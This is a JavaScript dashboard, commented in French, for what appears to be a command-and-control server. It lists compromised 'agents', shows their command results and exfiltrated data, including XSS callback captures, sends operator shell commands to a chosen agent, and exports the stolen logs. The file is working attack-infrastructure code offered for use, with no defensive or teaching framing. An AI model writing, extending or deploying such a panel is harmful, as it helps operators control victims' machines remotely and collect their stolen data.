let currentAgentId = null;
let agentsCache = [];
let exfilsCache = {};

async function fetchAgents() {
    const res = await fetch('/agents');
    const data = await res.json();
    return data.agents || [];
}

async function fetchLogs(agentId) {
    const res = await fetch(`/monitor/${agentId}`);
    const data = await res.json();
    return data.logs || [];
}

async function fetchExfiltration(agentId) {
    const res = await fetch(`/monitor/${agentId}/exfiltrated`);
    const data = await res.json();
    return data.data || [];
}

async function fetchCommandsHistory(agentId) {
    const res = await fetch(`/monitor/${agentId}/commands/history`);
    const data = await res.json();
    return data.history || [];
}

async function fetchPendingCommands() {
    let total = 0;
    for (const agent of agentsCache) total += agent.commandCount || 0;
    return total;
}

function escapeHtml(str) {
    return String(str).replace(/[&<>"']/g, s =>
        ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[s])
    );
}

// -------- AGENT LIST & SELECT ---------
function renderAgentList(agents) {
    const list = document.getElementById('agent-list');
    list.innerHTML = '';
    agents.forEach(agent => {
        const div = document.createElement('div');
        div.className = 'agent-card' + (agent.id === currentAgentId ? ' selected' : '');
        div.innerHTML = `
            <div><strong>${agent.id}</strong></div>
            <div class="mini">${agent.info.platform || '-'}</div>
            <div class="mini">Vu: ${new Date(agent.lastSeen).toLocaleTimeString()}</div>
            <button class="btn-exfil" data-agent="${agent.id}">Exfils</button>
        `;
        div.onclick = e => {
            if (e.target.classList.contains('btn-exfil')) return;
            currentAgentId = agent.id;
            renderAgentList(agentsCache);
            loadChat();
        };
        div.querySelector('.btn-exfil').onclick = async e => {
            e.stopPropagation();
            currentAgentId = agent.id;
            renderAgentList(agentsCache);
            showExfils();
        };
        list.appendChild(div);
    });
}

// -------- IA-STYLE CHAT MAIN PANEL ---------
function msgBox({ type, content, time }) {
    let cls = "msg ";
    if (type === "agent") cls += "agent";
    else if (type === "cmd") cls += "cmd";
    else if (type === "exfil") cls += "exfil";
    else cls += "c2";
    return `<div class="${cls}">
        ${content}
        <div class="msg time">${time ? new Date(time).toLocaleString() : ""}</div>
    </div>`;
}

async function loadChat() {
    if (!currentAgentId) {
        document.getElementById('ia-messages').innerHTML = "<div class='msg c2'>Sélectionnez un agent à gauche pour commencer.</div>";
        return;
    }
    const logs = await fetchLogs(currentAgentId);
    const cmds = await fetchCommandsHistory(currentAgentId);
    let html = '';
    let combined = [];

    // Combine logs (exfil, command_result, etc.) and commands (sent)
    logs.forEach(l => {
        if (l.result && l.result.type === "command_result") {
            combined.push({ type: "agent", content: `<b>Résultat:</b><pre style="margin:2px 0 0 0;font-size:12px">${escapeHtml(l.result.data.result).slice(0, 600)}</pre>`, time: l.time });
        } else if (l.result && l.result.type === "exfiltration") {
            let val = l.result.data;
            combined.push({ type: "exfil", content: `<b>Exfil ${escapeHtml(val.data_type)}</b><br><code>${escapeHtml(JSON.stringify(val.content)).slice(0, 400)}</code>`, time: l.time });
        }
        // Ajoute aussi les logs génériques
        else if (typeof l.result === "string" && l.result.startsWith("XSS Callback")) {
            combined.push({ type: "exfil", content: `<b>XSS Callback</b><br><code>${escapeHtml(l.result).slice(0, 350)}</code>`, time: l.time });
        }
    });
    cmds.forEach(cmd => {
        combined.push({ type: "cmd", content: `<b>Commande envoyée:</b> <code>${escapeHtml(cmd.command)}</code>`, time: cmd.timestamp });
    });

    // Tri chronologique
    combined = combined.sort((a, b) => new Date(a.time) - new Date(b.time)).slice(-40);

    html = combined.map(msgBox).join('');
    document.getElementById('ia-messages').innerHTML = html || "<div class='msg c2'>Aucune activité récente.</div>";
    scrollToBottom();
}

function scrollToBottom() {
    setTimeout(() => {
        const m = document.getElementById('ia-messages');
        m.scrollTop = m.scrollHeight;
    }, 100);
}

async function showExfils() {
    if (!currentAgentId) return;

    // Récupérer les nouvelles exfiltrations depuis le serveur
    const exfils = await fetchExfiltration(currentAgentId);
    const existingExfils = exfilsCache[currentAgentId] || [];

    // Fusionner les nouvelles données avec celles déjà en cache
    const uniqueExfils = exfils.filter(newExfil =>
        !existingExfils.some(existingExfil => existingExfil.timestamp === newExfil.timestamp)
    );

    // Ajouter au cache
    exfilsCache[currentAgentId] = [...existingExfils, ...uniqueExfils];

    // Afficher les exfiltrations sans réinitialiser la vue
    const messagesDiv = document.getElementById('ia-messages');
    uniqueExfils.forEach(entry => {
        const exfilHTML = `
            <div class="msg exfil">
                <b>Type:</b> ${escapeHtml(entry.type)}<br>
                <b>Date:</b> ${new Date(entry.timestamp).toLocaleString()}<br>
                <b>Payload:</b> <span class="payload">${entry.data.payload ? escapeHtml(entry.data.payload).slice(0, 350) + (entry.data.payload.length > 350 ? ' ...' : '') : '-'}</span><br>
                ${entry.data.endpoints ? `<b>Endpoints:</b><ul>${entry.data.endpoints.map(ep => `<li>${escapeHtml(ep)}</li>`).join('')}</ul>` : ''}
                ${Object.keys(entry.data).filter(k => k !== 'payload' && k !== 'endpoints').map(k => `<b>${escapeHtml(k)}:</b> ${escapeHtml(JSON.stringify(entry.data[k]))}<br>`).join('')}
            </div>
        `;
        messagesDiv.innerHTML += exfilHTML;
    });

    scrollToBottom(); // Scroll automatique vers le bas uniquement si de nouvelles exfiltrations ont été ajoutées
}

// -------- COPIER ET EXPORTER ---------
function copyContent(type) {
    const messagesDiv = document.getElementById('ia-messages');
    const content = messagesDiv.innerText;
    navigator.clipboard.writeText(content)
        .then(() => alert(`${type} copiés dans le presse-papier.`))
        .catch(err => alert(`Erreur de copie : ${err}`));
}

function exportContent(type) {
    const messagesDiv = document.getElementById('ia-messages');
    const content = messagesDiv.innerText;
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${type}_${currentAgentId}_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
}

// -------- ENVOI DE COMMANDE SHELL ---------
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('ia-form').onsubmit = async e => {
        e.preventDefault();
        if (!currentAgentId) return alert("Sélectionnez un agent !");
        const input = document.getElementById('ia-input');
        const val = input.value.trim();
        if (!val) return;
        await fetch(`/monitor/${currentAgentId}/commands`, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: val })
        });
        input.value = "";
        loadChat();
    };

    document.getElementById('copy-logs').onclick = () => copyContent('Logs');
    document.getElementById('export-logs').onclick = () => exportContent('Logs');
});

// --------- GLOBAL REFRESH & STATS ---------
async function refreshAll() {
    agentsCache = await fetchAgents();
    renderAgentList(agentsCache);
    let exfilTotal = 0;
    for (const agent of agentsCache) {
        let exfils = exfilsCache[agent.id];
        if (!exfils) exfils = await fetchExfiltration(agent.id);
        exfilTotal += exfils.length;
    }
    const pendingCmds = await fetchPendingCommands();
    document.getElementById('active-agents').textContent = agentsCache.length;
    document.getElementById('exfil-data').textContent = exfilTotal;
    document.getElementById('pending-commands').textContent = pendingCmds;
}

document.addEventListener('DOMContentLoaded', () => {
    refreshAll();
    setInterval(refreshAll, 7000);
});